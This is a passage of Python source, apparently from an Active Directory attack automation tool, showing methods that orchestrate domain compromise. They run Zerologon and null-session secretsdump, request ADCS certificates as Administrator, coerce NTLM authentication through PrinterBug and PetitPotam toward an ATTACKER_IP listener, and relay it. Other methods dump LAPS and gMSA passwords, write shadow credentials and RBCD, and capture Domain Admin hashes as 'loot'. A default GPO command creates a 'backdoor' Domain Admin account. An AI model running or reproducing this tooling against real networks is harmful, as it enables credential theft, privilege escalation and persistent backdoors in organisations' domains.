                await emit({"stream": "stdout", "line": f"[!!!] HIT → {domain}\\{user}:<redacted>", "ts": _ts()})
                hits += 1
            else:
                await emit({"stream": "stdout", "line": f"[-] {user} — no match", "ts": _ts()})

        await emit({"stream": "stdout", "line": f"[+] Spray done. {hits}/{len(users)} hit(s).", "ts": _ts()})
        return 0

    async def _run_netview(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        auth = ["-hashes", hashes] if hashes else []
        creds = f"{domain}/{username}:{password}" if not hashes else f"{domain}/{username}"

        cmd = [
            "impacket-netview",
            creds, *auth,
            "-target", target,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_dacledit(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        action = params.get("action", "read")
        principal = params.get("principal", username)
        target_dn = params.get("target_dn", "")
        dc_ip = params.get("dc_ip", target)

        auth = ["-hashes", hashes] if hashes else []
        creds = f"{domain}/{username}:{password}" if not hashes else f"{domain}/{username}"

        cmd = [
            "impacket-dacledit",
            "-action", action,
            "-dc-ip", dc_ip,
            "-principal", principal,
            *(["-target-dn", target_dn] if target_dn else []),
            *auth,
            creds,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_changepasswd(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        target_user = params.get("target_user", "")
        new_password = params.get("new_password", "")
        dc_ip = params.get("dc_ip", target)

        if not target_user or not new_password:
            await emit({"stream": "stderr", "line": "[!] changepasswd requires target_user and new_password", "ts": _ts()})
            return 1

        auth = ["-hashes", hashes] if hashes else []

        cmd = [
            "impacket-changepasswd",
            f"{domain}/{target_user}@{dc_ip}",
            "-newpass", new_password,
            "-altuser", username,
            "-altpass", password,
            *auth,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_smb_signing_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        if not shutil.which("nmap"):
            await emit({"stream": "stderr", "line": "[!] nmap not found in PATH", "ts": _ts()})
            return 1
        await emit({"stream": "stdout", "line": f"[*] Checking SMB signing on {target}", "ts": _ts()})
        cmd = ["nmap", "-p", "445", "--script", "smb2-security-mode,smb-security-mode", "-T4", target]
        return await self._stream_subprocess(cmd, emit)

    async def _run_llmnr_nbtns_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        if not shutil.which("nmap"):
            await emit({"stream": "stderr", "line": "[!] nmap not found in PATH", "ts": _ts()})
            return 1
        await emit({"stream": "stdout", "line": f"[*] Checking LLMNR (5355) and NBT-NS (137) on {target}", "ts": _ts()})
        cmd = ["nmap", "-sU", "-p", "137,5355", "--script", "nbstat", "-T4", target]
        rc = await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stdout", "line": "[*] Note: LLMNR/NBT-NS active response requires Responder — this check confirms port exposure only.", "ts": _ts()})
        return rc

    async def _run_ntlm_config_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        auth = ["-hashes", hashes] if hashes else []
        target_str = f"{domain}/{username}:{password}@{target}" if not hashes else f"{domain}/{username}@{target}"
        await emit({"stream": "stdout", "line": "[*] Querying NTLM LmCompatibilityLevel and NTLMMinClientSec via registry", "ts": _ts()})
        for key in [
            r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
            r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0",
        ]:
            cmd = ["impacket-reg", *auth, target_str, "query", "-keyName", key, "-s"]
            await self._stream_subprocess(cmd, emit)
        return 0

    async def _run_ldap_signing_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        if not shutil.which("nmap"):
            await emit({"stream": "stderr", "line": "[!] nmap not found in PATH", "ts": _ts()})
            return 1
        await emit({"stream": "stdout", "line": f"[*] Checking LDAP signing / channel binding via RootDSE on {target}", "ts": _ts()})
        cmd1 = ["nmap", "-p", "389,636", "--script", "ldap-rootdse", "-T4", target]
        rc = await self._stream_subprocess(cmd1, emit)
        if shutil.which("ldapsearch"):
            cmd2 = [
                "ldapsearch", "-x", "-H", f"ldap://{target}", "-s", "base",
                "-b", "", "supportedCapabilities", "supportedControl",
            ]
            await self._stream_subprocess(cmd2, emit)
        return rc

    async def _run_winrm_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        if not shutil.which("nmap"):
            await emit({"stream": "stderr", "line": "[!] nmap not found in PATH", "ts": _ts()})
            return 1
        await emit({"stream": "stdout", "line": f"[*] Checking WinRM exposure (5985/5986) on {target}", "ts": _ts()})
        cmd = ["nmap", "-p", "5985,5986", "--script", "http-auth-finder", "-sV", "-T4", target]
        return await self._stream_subprocess(cmd, emit)

    async def _run_open_shares_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        await emit({"stream": "stdout", "line": f"[*] Testing null/guest session share access on {target}", "ts": _ts()})
        for cred in [f"''@{target}", f"guest:@{target}"]:
            cmd = ["impacket-smbclient", cred, "-c", "shares"]
            await self._stream_subprocess(cmd, emit)
        return 0

    async def _run_cred_manager_check(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        auth = ["-hashes", hashes] if hashes else []
        target_str = f"{domain}/{username}:{password}@{target}" if not hashes else f"{domain}/{username}@{target}"
        await emit({"stream": "stdout", "line": "[*] Checking Credential Manager / Autologon registry keys", "ts": _ts()})
        for key in [
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings",
            r"HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities",
        ]:
            cmd = ["impacket-reg", *auth, target_str, "query", "-keyName", key]
            await self._stream_subprocess(cmd, emit)
        return 0

    # ── Manual-step no-op helper ─────────────────────────────────────────────

    async def _manual_step(self, params: dict, emit, title: str, lines: list[str]) -> int:
        """Emit instructions for a manual step and return 0 (caller handles the real work)."""
        await emit({"stream": "stdout", "line": f"[*] === MANUAL STEP: {title} ===", "ts": _ts()})
        for line in lines:
            await asyncio.sleep(0.05)
            await emit({"stream": "stdout", "line": line, "ts": _ts()})
        await emit({"stream": "stdout", "line": "[*] Proceed manually, then continue chain.", "ts": _ts()})
        return 0

    # ── Zerologon ────────────────────────────────────────────────────────────

    async def _run_zerologon(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        dc_ip = params.get("dc_ip", target)
        domain = params.get("domain", "")
        # Derive DC hostname from domain or target
        dc_name = params.get("dc_name", domain.split(".")[0].upper() + "$" if domain else "DC")
        await emit({"stream": "stdout", "line": f"[*] Zerologon (CVE-2020-1472) — target: {dc_ip}", "ts": _ts()})
        await emit({"stream": "stdout", "line": f"[*] DC NetBIOS name: {dc_name}", "ts": _ts()})
        # Try impacket-based zerologon exploit (zerologon.py from impacket examples)
        for tool in ["zerologon_tester.py", "cve_2020_1472_exploit.py"]:
            path = shutil.which(tool)
            if path:
                cmd = ["python3", path, dc_name, dc_ip]
                return await self._stream_subprocess(cmd, emit)
        # Fallback: secretsdump with null creds (impacket built-in)
        await emit({"stream": "stdout", "line": "[*] Zerologon standalone tool not found — attempting null-session secretsdump", "ts": _ts()})
        cmd = ["impacket-secretsdump", f"{domain}/:{dc_ip}@{dc_ip}", "-just-dc"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_zerologon_restore(self, job_id: str, params: dict, emit) -> int:
        dc_ip = params.get("dc_ip", params.get("target", ""))
        domain = params.get("domain", "")
        original_hash = params.get("original_hash", "<ORIGINAL_HASH>")
        dc_name = params.get("dc_name", domain.split(".")[0].upper() + "$" if domain else "DC$")
        return await self._manual_step(params, emit, "Restore DC Machine Account Password", [
            "[!] IMPORTANT: Restore the DC machine account password to prevent domain desync.",
            f"[*] Run: python3 restorepassword.py {domain}/{dc_name}@{dc_ip} -target-ip {dc_ip} -hexpass {original_hash}",
            "[*] Or use secretsdump to obtain the original hash first if not captured.",
        ])

    # ── Certipy / ADCS ───────────────────────────────────────────────────────

    async def _run_certipy_find(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        cert_user = _certipy_user(username, domain)
        await emit({"stream": "stdout", "line": f"[*] Certipy — enumerating ADCS templates and CAs on {dc_ip}", "ts": _ts()})
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            cmd = ["certipy", "find", "-u", cert_user, "-hashes", f":{nt}", "-dc-ip", dc_ip, "-vulnerable", "-enabled", "-stdout"]
        else:
            cmd = ["certipy", "find", "-u", cert_user, "-p", password, "-dc-ip", dc_ip, "-vulnerable", "-enabled", "-stdout"]
        rc, output = await self._stream_subprocess_capture(cmd, emit)
        output_text = "\n".join(output)
        if rc != 0 or "[-]" in output_text or "invalidCredentials" in output_text or "authentication failed" in output_text.lower():
            await emit({"stream": "stdout", "line": "[*] Hint: install with 'pip install certipy-ad'", "ts": _ts()})
            return rc or 1
        ca_name = ""
        current_template = ""
        seen_templates: set[str] = set()
        for line in output:
            ca_match = re.search(r"CA Name\s*:\s*(.+)$", line)
            template_match = re.search(r"Template Name\s*:\s*(.+)$", line)
            if ca_match and not ca_name:
                ca_name = ca_match.group(1).strip()
            if template_match:
                current_template = template_match.group(1).strip()
            if current_template and current_template not in seen_templates and re.search(r"\bESC1\b", line):
                seen_templates.add(current_template)
                await emit({"stream": "loot", "loot_type": "vulnerable_template", "data": current_template, "ts": _ts()})
                await emit({"stream": "stdout", "line": f"[+] Vulnerable template selected → {current_template}", "ts": _ts()})
                current_template = ""
        if ca_name:
            await emit({"stream": "loot", "loot_type": "ca_name", "data": ca_name, "ts": _ts()})
            await emit({"stream": "stdout", "line": f"[+] Certificate authority selected → {ca_name}", "ts": _ts()})
        return 0

    async def _run_certipy_req(self, job_id: str, params: dict, emit) -> int:
        from adbygod_api.core.workspace import job_workspace
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        ca = params.get("ca", "")
        template = params.get("template", "User")
        upn = params.get("upn", f"Administrator@{domain}")
        out_prefix = params.get("out") or f"adbygod_cert_{job_id}"
        cert_user = _certipy_user(username, domain)
        await emit({"stream": "stdout", "line": f"[*] Certipy — requesting certificate via {template} template as {upn}", "ts": _ts()})
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth_args = ["-hashes", f":{nt}"]
        else:
            auth_args = ["-p", password]
        async with job_workspace(job_id) as ws:
            job_out_prefix = ws.artifact(os.path.basename(out_prefix))
            base_cmd = ["certipy", "req", "-u", cert_user, *auth_args, "-dc-ip", dc_ip]
            if ca:
                base_cmd += ["-ca", ca]
            base_cmd += ["-template", template, "-upn", upn, "-out", job_out_prefix]
            rc, output = await self._stream_subprocess_capture(base_cmd, emit, cwd=ws.path)
            expected = job_out_prefix if job_out_prefix.endswith(".pfx") else f"{job_out_prefix}.pfx"
            pfx_candidates = [expected] + [p for p in ws.list_artifacts("*.pfx") if p != expected]
            pfx_file = next((p for p in pfx_candidates if p and os.path.exists(p)), "")
            output_text = "\n".join(output)
            if rc != 0 or "[-]" in output_text or "Traceback" in output_text or "Got error" in output_text:
                if "CERTSRV_E_UNSUPPORTED_CERT_TYPE" in output_text:
                    await emit({
                        "stream": "stderr",
                        "line": f"[!] CA '{ca or dc_ip}' rejected template '{template}' as unsupported. The template is visible in LDAP but is not usable through this CA. Enable/publish the template on the CA or select another ADCS path/template.",
                        "ts": _ts(),
                    })
                await emit({"stream": "stderr", "line": "[!] Certipy request failed; no certificate will be passed to later steps", "ts": _ts()})
                ws.mark_failed()
                return rc or 1
            if not pfx_file:
                await emit({"stream": "stderr", "line": f"[!] Certipy request completed but no PFX was created at {expected}", "ts": _ts()})
                ws.mark_failed()
                return 1
            await emit({"stream": "stdout", "line": f"[+] Certificate saved to {pfx_file}", "ts": _ts()})
            await emit({"stream": "loot", "loot_type": "da_certificate", "data": pfx_file, "ts": _ts()})
            # Return 0 here while still inside the workspace context so the PFX
            # path remains valid if the caller reads it synchronously via loot.
            # The workspace is cleaned after the context exits.
            return 0

    async def _run_certipy_auth(self, job_id: str, params: dict, emit) -> int:
        from adbygod_api.core.workspace import job_workspace
        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        pfx_file = params.get("pfx_file") or params.get("da_certificate") or "administrator.pfx"
        username = params.get("target_user", "Administrator")
        await emit({"stream": "stdout", "line": f"[*] Certipy — PKINIT auth using {pfx_file}", "ts": _ts()})
        if not os.path.exists(pfx_file):
            await emit({"stream": "stderr", "line": f"[!] PFX file not found: {pfx_file}", "ts": _ts()})
            return 1
        async with job_workspace(f"{job_id}_auth") as ws:
            cmd = ["certipy", "auth", "-pfx", pfx_file, "-username", username, "-domain", domain, "-dc-ip", dc_ip,
                   "-out", ws.artifact(username)]
            rc, output = await self._stream_subprocess_capture(cmd, emit, cwd=ws.path)
            if rc == 0:
                await emit({"stream": "loot", "loot_type": "da_certificate", "data": pfx_file, "ts": _ts()})
                for line in output:
                    lm_nt = re.search(r"\b([a-f0-9]{32}):([a-f0-9]{32})\b", line, re.IGNORECASE)
                    nt_only = re.search(r"NT hash[^:]*:\s*([a-f0-9]{32})\b", line, re.IGNORECASE)
                    if lm_nt:
                        da_hash = f"{lm_nt.group(1)}:{lm_nt.group(2)}"
                        await emit({"stream": "loot", "loot_type": "da_hashes", "data": da_hash, "ts": _ts()})
                        await emit({"stream": "stdout", "line": f"[+] Domain Admin hash captured → {lm_nt.group(2)[:8]}...", "ts": _ts()})
                        break
                    if nt_only:
                        da_hash = f":{nt_only.group(1)}"
                        await emit({"stream": "loot", "loot_type": "da_hashes", "data": da_hash, "ts": _ts()})
                        await emit({"stream": "stdout", "line": f"[+] Domain Admin hash captured → {nt_only.group(1)[:8]}...", "ts": _ts()})
                        break
                for ccache in ws.list_artifacts("*.ccache"):
                    await emit({"stream": "loot", "loot_type": "ccache", "data": ccache, "ts": _ts()})
            else:
                ws.mark_failed()
            return rc

    async def _run_certipy_template(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        template = params.get("template", "")
        cert_user = _certipy_user(username, domain)
        await emit({"stream": "stdout", "line": f"[*] Certipy — modifying template '{template}' to enable SAN + any-enroll", "ts": _ts()})
        if not template:
            await emit({"stream": "stderr", "line": "[!] No template name provided — run certipy_find first", "ts": _ts()})
            return 1
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth_args = ["-hashes", f":{nt}"]
        else:
            auth_args = ["-p", password]
        cmd = [
            "certipy", "template",
            "-u", cert_user,
            *auth_args,
            "-dc-ip", dc_ip,
            "-template", template,
            "-write-default-configuration",
            "-force",
        ]
        rc, output = await self._stream_subprocess_capture(cmd, emit)
        output_text = "\n".join(output)
        if rc != 0 or "[-]" in output_text or "doesn't have permission" in output_text:
            await emit({"stream": "stderr", "line": "[!] Certipy template modification failed; no template changes were applied", "ts": _ts()})
            return rc or 1
        await emit({"stream": "loot", "loot_type": "modified_template", "data": template, "ts": _ts()})
        return 0

    # ── Coercion + Relay ─────────────────────────────────────────────────────

    async def _run_coerce(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        dc_ip = params.get("dc_ip", target)
        listener_ip = params.get("listener_ip", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        if not listener_ip:
            # Get attacker IP — default to routing interface
            import socket
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((dc_ip, 80))
                listener_ip = s.getsockname()[0]
                s.close()
            except Exception:
                listener_ip = "ATTACKER_IP"
        await emit({"stream": "stdout", "line": f"[*] Coercing NTLM auth from {dc_ip} → {listener_ip}", "ts": _ts()})
        await emit({"stream": "stdout", "line": "[*] Trying PrinterBug (MS-RPRN) first...", "ts": _ts()})
        # Try PrinterBug
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth_args = ["-hashes", f":{nt}"]
        else:
            auth_args = ["-p", password] if password else []
        creds = f"{domain}/{username}" if username else ""
        printerbug_tools = ["printerbug.py", "impacket-printerbug"]
        for tool in printerbug_tools:
            if shutil.which(tool):
                cmd = [tool, *([creds] if creds else []), *auth_args, dc_ip, listener_ip]
                rc = await self._stream_subprocess(cmd, emit)
                if rc == 0:
                    return 0
        await emit({"stream": "stdout", "line": "[*] PrinterBug failed/not found — trying PetitPotam (MS-EFSRPC)...", "ts": _ts()})
        for tool in ["PetitPotam.py", "petitpotam.py"]:
            if shutil.which(tool):
                cmd = [tool]
                if username:
                    cmd += ["-u", username, "-p", password or ""]
                cmd += [listener_ip, dc_ip]
                rc = await self._stream_subprocess(cmd, emit)
                return rc
        await emit({"stream": "stderr", "line": "[!] No coercion tool found. Install printerbug.py or PetitPotam.py", "ts": _ts()})
        return 1

    async def _run_ntlmrelayx(self, job_id: str, params: dict, emit) -> int:
        dc_ip = params.get("dc_ip", params.get("target", ""))
        mode = params.get("mode", "ldap")
        await emit({"stream": "stdout", "line": f"[*] ntlmrelayx — relay to {mode}://{dc_ip}", "ts": _ts()})
        await emit({"stream": "stdout", "line": "[!] ntlmrelayx requires interactive mode — run in separate terminal:", "ts": _ts()})
        await emit({"stream": "stdout", "line": f"    impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user $(whoami) -smb2support", "ts": _ts()})
        await emit({"stream": "stdout", "line": "[*] Then trigger coercion from target DC to your listener IP.", "ts": _ts()})
        return 0

    async def _run_ntlmrelayx_adcs(self, job_id: str, params: dict, emit) -> int:
        ca_ip = params.get("ca_ip", params.get("target", ""))
        await emit({"stream": "stdout", "line": f"[*] ntlmrelayx → ADCS HTTP enrollment: http://{ca_ip}/certsrv/", "ts": _ts()})
        await emit({"stream": "stdout", "line": "[!] Run in separate terminal:", "ts": _ts()})
        await emit({"stream": "stdout", "line": f"    impacket-ntlmrelayx -t http://{ca_ip}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController", "ts": _ts()})
        return 0

    # ── Shadow Credentials ───────────────────────────────────────────────────

    async def _run_whisker(self, job_id: str, params: dict, emit) -> int:
        target_dn = params.get("target_dn", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        await emit({"stream": "stdout", "line": f"[*] pyWhisker — writing msDS-KeyCredentialLink to {target_dn or 'target'}", "ts": _ts()})
        # Try pyWhisker (Python port)
        for tool in ["pywhisker.py", "pywhisker"]:
            if shutil.which(tool):
                if hashes:
                    nt = hashes.split(":")[-1] if ":" in hashes else hashes
                    auth_args = ["-H", nt]
                else:
                    auth_args = ["-P", password]
                cmd = [tool, "-d", domain, "-u", username, *auth_args, "--dc-ip", dc_ip, "--action", "add"]
                if target_dn:
                    cmd += ["--target", target_dn]
                return await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stderr", "line": "[!] pyWhisker not found. Install: pip install pywhisker", "ts": _ts()})
        return 1

    # ── gMSA ────────────────────────────────────────────────────────────────

    async def _run_gmsa_dump(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        await emit({"stream": "stdout", "line": f"[*] gMSA password dump via LDAP on {dc_ip}", "ts": _ts()})
        # Try bloodyAD
        for tool in ["bloodyAD", "bloodyad"]:
            if shutil.which(tool):
                if hashes:
                    nt = hashes.split(":")[-1] if ":" in hashes else hashes
                    cmd = [tool, "-u", username, "-p", f":{nt}", "-d", domain, "--host", dc_ip, "get", "object", "gMSA*", "--attr", "msDS-ManagedPassword"]
                else:
                    cmd = [tool, "-u", username, "-p", password, "-d", domain, "--host", dc_ip, "get", "object", "gMSA*", "--attr", "msDS-ManagedPassword"]
                return await self._stream_subprocess(cmd, emit)
        # Fallback to ldap query via impacket
        await emit({"stream": "stdout", "line": "[*] Attempting gMSA read via secretsdump LDAP", "ts": _ts()})
        if hashes:
            creds = f"{domain}/{username}@{dc_ip}"
            auth = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{dc_ip}"
            auth = []
        cmd = ["impacket-secretsdump", creds, *auth, "-just-dc-user", "gMSA*"]
        return await self._stream_subprocess(cmd, emit)

    # ── RBCD ────────────────────────────────────────────────────────────────

    async def _run_rbcd_write(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        delegate_to = params.get("delegate_to", target)
        delegate_from = params.get("delegate_from", "")
        await emit({"stream": "stdout", "line": "[*] Writing RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity", "ts": _ts()})
        await emit({"stream": "stdout", "line": f"[*] delegate_from={delegate_from} → delegate_to={delegate_to}", "ts": _ts()})
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth_extra = ["-hashes", f":{nt}"]
        else:
            auth_extra = []
        creds = f"{domain}/{username}"
        cmd = [
            "impacket-rbcd",
            creds, *auth_extra,
            "-dc-ip", dc_ip,
            "-action", "write",
            "-delegate-to", delegate_to,
            "-delegate-from", delegate_from,
        ]
        if not shutil.which("impacket-rbcd"):
            # Use dacledit as fallback
            cmd = ["impacket-dacledit", *([f"{domain}/{username}:{password}"] if password else [f"{domain}/{username}"]),
                   *auth_extra, "-dc-ip", dc_ip, "-action", "write", "-rights", "FullControl", "-target-dn", delegate_to]
        return await self._stream_subprocess(cmd, emit)

    async def _run_renamemachine(self, job_id: str, params: dict, emit) -> int:
        """Rename a machine account (part of noPac/sAMAccountName spoofing)."""
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        machine_name = params.get("machine_name", "")
        new_name = params.get("new_name", "")
        await emit({"stream": "stdout", "line": f"[*] Renaming machine account {machine_name} → {new_name} (noPac step)", "ts": _ts()})
        if not machine_name or not new_name:
            await emit({"stream": "stderr", "line": "[!] machine_name and new_name required", "ts": _ts()})
            return 1
        # noPac tools
        for tool in ["noPac.py", "nopac.py", "sAMAccountName-spoofing.py"]:
            if shutil.which(tool):
                await emit({"stream": "stdout", "line": f"[*] Using {tool}", "ts": _ts()})
                break
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth_args = ["-hashes", f":{nt}"]
        else:
            auth_args = ["-p", password]
        # Use impacket's rpcchangepwd or addcomputer for rename
        cmd = ["impacket-addcomputer", f"{domain}/{username}", *auth_args, "-dc-ip", dc_ip,
               "-computer-name", machine_name, "-computer-pass", "Password123!", "-method", "SAMR"]
        return await self._stream_subprocess(cmd, emit)

    # ── LAPS ────────────────────────────────────────────────────────────────

    async def _run_laps_dump(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        await emit({"stream": "stdout", "line": "[*] Reading LAPS passwords (ms-Mcs-AdmPwd) via LDAP", "ts": _ts()})
        # Try laps.py / LAPSToolkit
        for tool in ["laps.py", "LAPSToolkit.py"]:
            if shutil.which(tool):
                cmd = [tool, "-u", username, "-p", password or "", "-d", domain, "-dc-ip", dc_ip]
                return await self._stream_subprocess(cmd, emit)
        # Fallback: impacket ldap query for ms-Mcs-AdmPwd
        await emit({"stream": "stdout", "line": "[*] Using ldapsearch fallback for LAPS attribute", "ts": _ts()})
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth_args = ["-H", f":{nt}"]
        else:
            auth_args = ["-w", password]
        cmd = [
            "ldapsearch",
            "-x", "-H", f"ldap://{dc_ip}",
            "-D", f"{username}@{domain}",
            *auth_args,
            "-b", f"DC={domain.replace('.', ',DC=')}",
            "(ms-Mcs-AdmPwd=*)",
            "ms-Mcs-AdmPwd", "sAMAccountName",
        ]
        if shutil.which("ldapsearch"):
            rc = await self._stream_subprocess(cmd, emit)
            if rc == 0:
                await emit({"stream": "loot", "loot_type": "cleartext_creds", "data": "LAPS password(s) extracted — see output above", "ts": _ts()})
            return rc
        await emit({"stream": "stderr", "line": "[!] No LAPS tool found. Install laps.py or ldapsearch", "ts": _ts()})
        return 1

    # ── GPO ──────────────────────────────────────────────────────────────────

    async def _run_gpo_enum(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        await emit({"stream": "stdout", "line": "[*] Enumerating GPOs with write access via LDAP", "ts": _ts()})
        # Use ldapsearch or impacket to enumerate GPO ACLs
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            creds = f"{domain}/{username}"
            auth = ["-hashes", f":{nt}"]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        cmd = ["impacket-ldapdomaindump", creds, *auth, "-n", dc_ip, "--no-html", "--no-grep"]
        rc = await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stdout", "line": "[*] Review domain_policy.json for GPO write access (WriteDacl/WriteOwner/GenericAll)", "ts": _ts()})
        return rc

    async def _run_gpo_inject(self, job_id: str, params: dict, emit) -> int:
        gpo_id = params.get("gpo_id", "<GPO_ID>")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        command = params.get("command", "net user backdoor P@ssw0rd123 /add && net group \"Domain Admins\" backdoor /add")
        return await self._manual_step(params, emit, "GPO Abuse — Inject Scheduled Task", [
            f"[*] GPO ID: {gpo_id}",
            "[*] Using pyGPOAbuse:",
            f"    python3 pygpoabuse.py {domain}/{username}:{password} -gpo-id {gpo_id} -command '{command}'",
            "[*] Or use SharpGPOAbuse on a Windows host:",
            "    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount backdoor --GPOName '<GPO_NAME>'",
            "[*] Wait for Group Policy refresh (~90 minutes or gpupdate /force on targets)",
        ])

    # ── ACL Enumeration ──────────────────────────────────────────────────────

    async def _run_acl_enum(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        await emit({"stream": "stdout", "line": "[*] Enumerating ACLs for GenericAll/WriteDacl on privileged objects", "ts": _ts()})
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            creds = f"{domain}/{username}"
            auth = ["-hashes", f":{nt}"]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        cmd = ["impacket-ldapdomaindump", creds, *auth, "-n", dc_ip, "--no-html", "--no-grep"]
        rc = await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stdout", "line": "[*] Review ACL entries — look for GenericAll/GenericWrite on DA accounts", "ts": _ts()})
        await emit({"stream": "stdout", "line": "[*] Tip: run BloodHound for visual ACL path discovery", "ts": _ts()})
        return rc

    # ── Delegation Enumeration ───────────────────────────────────────────────

    async def _run_delegation_enum(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        await emit({"stream": "stdout", "line": "[*] Enumerating unconstrained/constrained delegation hosts", "ts": _ts()})
        if hashes:
            creds = f"{domain}/{username}"
            auth = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        cmd = ["impacket-findDelegation", creds, *auth, "-dc-ip", dc_ip]
        if not shutil.which("impacket-findDelegation"):
            cmd = ["impacket-GetADUsers", creds, *auth, "-dc-ip", dc_ip, "-all"]
        rc = await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stdout", "line": "[*] Look for TRUSTED_FOR_DELEGATION (unconstrained) hosts — especially non-DC computers", "ts": _ts()})
        return rc

    async def _run_rubeus_monitor(self, job_id: str, params: dict, emit) -> int:
        interval = params.get("interval", "5")
        return await self._manual_step(params, emit, "TGT Capture Monitor (Rubeus/krbrelayx)", [
            "[*] Start TGT monitor on unconstrained delegation host:",
            "    # Windows (Rubeus):",
            f"    Rubeus.exe monitor /interval:{interval} /nowrap",
            "    # Linux (krbrelayx):",
            "    python3 krbrelayx.py --krbsalt <DOMAIN>\\\\<MACHINE>$ --krbpass <MACHINE_PASS>",
            "[*] Keep this running, then trigger coercion in the next step.",
            "[*] DC TGT will appear in base64 — import with: Rubeus.exe ptt /ticket:<base64>",
        ])

    # ── User Enumeration + Password Spray ────────────────────────────────────

    async def _run_user_enum(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", target)
